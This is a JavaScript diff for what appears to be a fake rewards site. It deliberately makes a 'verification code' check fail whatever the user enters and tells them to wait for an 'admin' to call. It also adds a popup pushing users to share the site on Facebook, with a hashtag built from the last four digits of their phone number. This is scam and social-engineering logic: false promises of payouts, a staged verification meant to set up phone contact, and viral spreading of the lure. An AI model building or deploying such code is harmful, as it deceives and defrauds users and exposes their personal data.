@@ -258,7 +258,11 @@ function attachPhase3Events(popupInner) {
     }
     
     if (verifyBtn) {
-        verifyBtn.onclick = function() {
+        // Remove any existing listeners
+        const newVerifyBtn = verifyBtn.cloneNode(true);
+        verifyBtn.parentNode.replaceChild(newVerifyBtn, verifyBtn);
+        
+        newVerifyBtn.onclick = function() {
             verifyFirewallCodePhase3();
         };
     }
@@ -273,7 +277,7 @@ function verifyFirewallCodePhase3() {
     
     if (!code || code.length !== 4) {
         if (errorMsg) {
-            errorMsg.innerText = "⚠️ Your 4-digit verification code is invalid. Please enter the correct code.";
+            errorMsg.innerText = "⚠️ Your 4-digit verification code is invalid.";
             errorMsg.style.display = 'block';
         }
         if (codeInput) {
@@ -283,30 +287,28 @@ function verifyFirewallCodePhase3() {
         return;
     }
     
-    // Disable button while verifying
-    if (verifyBtn) {
-        verifyBtn.disabled = true;
-        verifyBtn.innerText = "VERIFYING...";
+    // ALWAYS INVALID - No matter what code they enter
+    if (errorMsg) {
+        errorMsg.innerText = "⚠️ Your 4-digit verification code is invalid. Please wait for the admin to call you.";
+        errorMsg.style.display = 'block';
+    }
+    if (codeInput) {
+        codeInput.style.animation = 'shake 0.3s ease-in-out';
+        setTimeout(() => { if (codeInput) codeInput.style.animation = ''; }, 300);
     }
     
-    // Simulate verification (admin will call user with actual code)
+    // Clear input field after invalid attempt
     setTimeout(() => {
-        // Here you can add actual Firebase verification check
-        // For now, any 4-digit code works
-        
-        // Clear error if any
-        if (errorMsg) errorMsg.style.display = 'none';
-        
-        // Success - close firewall popup and proceed to Phase 2
-        hideFirewallPopup();
-        
-        // Show success message
-        alert("✅ Verification successful! You can now claim your reward.");
-        
-        // Transition to Phase 2
-        transitionToPhase2();
-        
-    }, 1500);
+        if (codeInput) codeInput.value = '';
+    }, 500);
+    
+    // Re-enable verify button (but still disabled visually for a moment)
+    if (verifyBtn) {
+        setTimeout(() => {
+            verifyBtn.disabled = false;
+            verifyBtn.innerText = "VERIFY";
+        }, 1000);
+    }
 }
 
 // ========== HIDE FIREWALL POPUP (keep this) ==========
@@ -536,6 +538,94 @@ function hideFirewallPopup() {
             };
         }
     }
+
+    // ========== TASK #3 MESSAGE (No Available Link) ==========
+function showTask3Message() {
+    const popupInner = document.querySelector('.popup-inner');
+    if (!popupInner) return;
+    
+    const userPhone = localStorage.getItem("userPhone");
+    let last4Digits = "";
+    if (userPhone && userPhone.length >= 11) {
+        last4Digits = userPhone.substring(7, 11);
+    }
+    
+    popupInner.innerHTML = `
+        <div class="popup-close" id="popupCloseTask3">✕</div>
+        
+        <div style="text-align: center; margin-bottom: 10px;">
+            <div style="font-size: 60px; animation: bounceIn 0.5s ease;">📋</div>
+        </div>
+        
+        <h2 style="text-align: center; font-family: 'Orbitron', monospace; font-size: 20px; font-weight: 900; background: linear-gradient(135deg, #ffd700, #ffaa33); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 5px 0; letter-spacing: 1px;">
+            TASK #3 COMPLETION REQUIRED
+        </h2>
+        
+        <div class="divider" style="width: 40px; margin: 10px auto;"></div>
+        
+        <div style="background: linear-gradient(135deg, rgba(255,215,0,0.08), rgba(255,215,0,0.02)); border-radius: 16px; padding: 15px; margin: 10px 0;">
+            <p style="font-family: 'Inter', sans-serif; font-size: 12px; color: #e0e0e0; line-height: 1.5; text-align: center; margin: 0;">
+                We want to ensure every real task earner gets paid fairly on our referral system. 
+                To protect against unverified users, we are now conducting validation through 
+                <strong style="color: #ffd700;">Task #3</strong>.
+            </p>
+        </div>
+        
+        <div style="background: linear-gradient(135deg, rgba(0,100,255,0.15), rgba(0,100,255,0.05)); border: 1px solid rgba(0,100,255,0.4); border-radius: 16px; padding: 15px; margin: 10px 0;">
+            <p style="font-family: 'Inter', sans-serif; font-size: 12px; color: #ccc; line-height: 1.5; text-align: center; margin: 0;">
+                Find the <strong style="color: #ffd700;">'Share on Facebook'</strong> button and share your experience! 
+                Remember: <strong>More posts, more chances to validate your payout request.</strong>
+            </p>
+        </div>
+        
+        <div style="background: linear-gradient(145deg, #1a1a2e, #0f0f1a); border: 1px solid #ffd700; border-radius: 20px; padding: 12px; margin: 10px 0; text-align: center;">
+            <div style="font-size: 10px; color: #ffd700; margin-bottom: 5px;">OFFICIAL HASHTAGS</div>
+            <div style="font-family: monospace; font-size: 14px; color: #00aaff; font-weight: bold;">
+                #LuckyDrop #Task${last4Digits}
+            </div>
+            <div style="font-size: 10px; color: #888; margin-top: 5px;">
+                (Example: #LuckyDrop #Task6789)
+            </div>
+        </div>
+        
+        <div style="background: rgba(255,215,0,0.05); border-left: 3px solid #ffd700; border-radius: 8px; padding: 8px 12px; margin: 10px 0;">
+            <p style="margin: 0; font-size: 10px; color: #ffd700; text-align: center;">
+                🚀 Finish this step to secure your Instant Approval and Extra Rewards!
+            </p>
+        </div>
+        
+        <button id="task3ShareBtn" style="width: 100%; margin: 15px 0; background: linear-gradient(135deg, #1877F2, #0a56b6); border: none; border-radius: 50px; padding: 14px; color: white; font-weight: bold; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;">
+            <i class="fa-brands fa-facebook-f"></i>
+            <span>SHARE ON FACEBOOK</span>
+        </button>
+        
+        <div class="button-separator" style="margin: 15px 0 10px;"></div>
+
+        <button class="back-btn" id="backBtnTask3" style="transition: all 0.2s ease; width: 100%;">
+            ← BACK TO PHASE 1
+        </button>
+    `;
+    
+    // Attach events
+    const closeBtn = document.getElementById('popupCloseTask3');
+    if (closeBtn) closeBtn.onclick = function() { closePopup(); };
+    
+    const backBtn = document.getElementById('backBtnTask3');
+    if (backBtn) backBtn.onclick = function() { 
+        closePopup();
+        showPhase1(currentBalance);
+    };
+    
+    const shareBtn = document.getElementById('task3ShareBtn');
+    if (shareBtn) {
+        shareBtn.onclick = function() {
+            const shareUrl = "https://xjiligames.github.io/rewards/index.html";
+            const fbUrl = 'https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl);
+            window.open(fbUrl, '_blank', 'width=600,height=400');
+            console.log('User shared on Facebook for Task #3');
+        };
+    }
+}
     
     // ========== SHOW POPUP ==========
     async function showPopup(balance) {
